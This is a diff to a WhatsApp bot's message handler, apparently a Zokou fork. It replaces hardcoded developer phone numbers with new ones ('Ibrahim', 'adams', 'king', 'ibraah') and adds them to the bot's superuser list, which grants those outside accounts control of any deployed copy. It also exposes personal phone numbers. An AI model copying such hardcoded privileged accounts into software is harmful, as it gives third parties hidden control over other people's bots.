@@ -132,10 +132,10 @@ setTimeout(() => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dj='22559763447';
-             const dj2='2250143343357';
-             const luffy='22891733300'*/
-            /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+            /* const Ibrahim='254710772666';
+             const adams='254710772666';
+             const ibraah='254739937062'*/
+            /*  var superUser=[servBot,Ibrahim,adams,ibraah].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
               var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
@@ -154,12 +154,12 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
-            const luffy = '254710772666';
+            const Ibrahim  = '254710772666';
+            const adams = '254739937062';
+            const king = "254710772666";
+            const ibraah = '254739937062';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, Ibrahim, adams, king, ibraah, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -599,7 +599,7 @@ function mybotpic() {
             //execution des commandes   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
-                const cd = evt.cm.find((france) => zokou.nomCom === (com));
+                const cd = evt.cm.find((zokou) => zokou.nomCom === (com));
                 if (cd) {
                     try {
 
